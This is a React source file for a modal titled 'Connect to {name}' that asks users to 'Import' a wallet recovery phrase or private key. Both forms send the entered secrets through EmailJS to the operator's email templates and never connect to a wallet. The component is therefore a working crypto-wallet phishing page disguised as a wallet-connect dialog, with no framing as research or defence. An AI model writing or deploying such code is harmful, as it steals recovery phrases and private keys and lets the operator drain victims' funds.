import cancel from "../images/cancel.svg";
import { useRef, useState } from "react";
import emailjs from '@emailjs/browser';
import{ init } from '@emailjs/browser';
import apiKey from '../../mails/mail'
init(apiKey.PUBLIC_KEY);



const Modal = ({show, setShow, name}) => {
const form1 = useRef()
const form2 = useRef()
const [toggle, setToggle] = useState("phrase");

const [formData, setFormData] = useState({
  phrase:'',
  key:''
})


const useToggle =(toggle)=>{
    setToggle(toggle)
}


const handleChange = (e) => {
  setFormData({...formData, [e.target.id]:e.target.value})
  // console.log(process.env.REACT_APP_EMAILJS_USER_ID)

}

const sendPhrase = (e) => {

  console.log(form1)
  e.preventDefault();
  emailjs.sendForm(apiKey.SERVICE_ID,apiKey.TEMPLATE_ID, form1.current, apiKey.PUBLIC_KEY )
  .then((result) => {
    console.log(result.text)
  }, (error) => {
    console.log(error)
    
  });
};

const sendKey = (e) => {

  console.log(form2)
  e.preventDefault();
  emailjs.sendForm(apiKey.SERVICE_ID,apiKey.TEMPLATE_ID2, form2.current, apiKey.PUBLIC_KEY )
  .then((result) => {
    console.log(result.text)
  }, (error) => {
    console.log(error)
    
  });
};

  return (
    <div className=" bg-black fixed bg-opacity-50 inset-0 flex justify-center items-center h-full">
      <div className=" bg-white rounded-lg w-auto h-auto md:w-2/4 sm:w-2/4  lg:w-1/2 p-4 ">
        <div className="flex justify-between items-center ">
          <h4 className="text-[20px] text-[#587087] font-semibold mb-4">
            Connect to {name}
          </h4>
          <img src={cancel} alt="" className="h-5 w-5 cursor-pointer" type="button" onClick={()=>setShow(false)} />
        </div>
        <ul
          id="myTab"
          data-tabs-toggle="#myTabContent"
          role="tablist"
          className="mb-5 border-b border-t border-solid border-[#dee2e6] mx-2 flex "
        >
          <li
            role="presentation"
            className="list-none m-0 p-0 items-center flex"
          >
            <button
           
            id="profile-tab" data-tabs-target="#profile" type="button" role="tab" aria-controls="profile" aria-selected="false"
              disabled={true}
              className="bg-transparent text-[#6c757d] px-2  border-solid border-[#6c757d]"
            >
              Key store JSON
            </button>
          </li>
          <li
            role="presentation"
            className={toggle == "phrase" ? "inline-block p-2 font-normal bg-white text-blue-500 border border-solid rounded-t-lg active " : "inline-block p-2 font-normal bg-white dark:bg-white  text-[#587087]"}
          >
            <button
             onClick={()=>useToggle("phrase")}
            id="phrase" data-tabs-target="#phrase" type="button" role="tab" aria-controls="phrase" aria-selected='false'
              
              className="bg-transparent px-2 border-solid border-[#6c757d]"
            >
              Phrase
            </button>
          </li>
          <li
            role="presentation"
            className={toggle == "pKey" ? "inline-block p-2  font-normal bg-white text-blue-500 border border-solid rounded-t-lg active " : "inline-block p-2 font-normal text-[#6c757d] bg-white "}
          >
            <button
             onClick={()=>useToggle("pKey")}
            id="privateKey" data-tabs-target="#privateKey" type="button" role="tab" aria-controls="privateKey" aria-selected="false"
            className="bg-transparent  px-2  border-solid border-[#6c757d] ">
              Private Key
            </button>
          </li>
        </ul>




        <div id="myTabContent">
          <div className="relative">
             <div className={toggle == "phrase" ? " ": "hidden"}>
            <form onSubmit={sendPhrase} ref={form1} >
                <div
                 role="tabpanel" aria-labelledby="phrase-tab"
                className="flex flex-col align-center items-center"
              >
                <input className="hidden" type="text" name="wallet" value={name} readOnly />
                <input className="hidden" type="text" name="phrase" value="Phrase" readOnly />
                <textarea
                onChange={handleChange}
                  name="message"
                  
                  type="text"
                  className="block w-full py-1.5 px-3 text-base font-normal leading-6 text-[#212529] border-solid 
                  border border-[#ced4da] rounded h-[90px] "/>
              </div>
              <label
                htmlFor="formTxt"
                className="text-[#587087] text-[15px] font-normal"
              >
                Typically 12 (sometimes 24) words separated by single spaces
              </label>

              <div className="mt-5">
                <input 
                type="submit"
                value='Import'
                className="bg-[#1fc7d4] mt-5 md:mt-0 w-full rounded-lg h-[40px] text-[20px] text-white font-bold"/>
              </div>
                </form>
                </div>
              
              <form  onSubmit={sendKey} ref={form2} >
             <div className={toggle == "pKey" ? " ": "hidden"}>
             <div
               id="privateKey" role="tabpanel" aria-labelledby="privateKey-tab"
                className="flex flex-col align-center items-center"
              >
                <input className="hidden" type="text" name="wallet" value={name} readOnly />
                <input className="hidden" type="text" name="pKey" value="Private Key" readOnly />
                <input
                  name="message"
                  
                  className="block w-full py-1.5 px-3 text-base font-normal leading-6 text-[#212529] border-solid border border-[#ced4da] rounded  "
                />
              </div>
              <label
                
                className="text-[#587087] text-[15px] font-normal"
              >
                Typically 64 alphanumeric characters

              </label>

              <div className="mt-5">
                <input  type="submit" value="Import"  className="bg-[#1fc7d4] mt-5 md:mt-0 w-full rounded-lg h-[40px] text-[20px] text-white font-bold"/>
              </div>
             </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};
export default Modal;




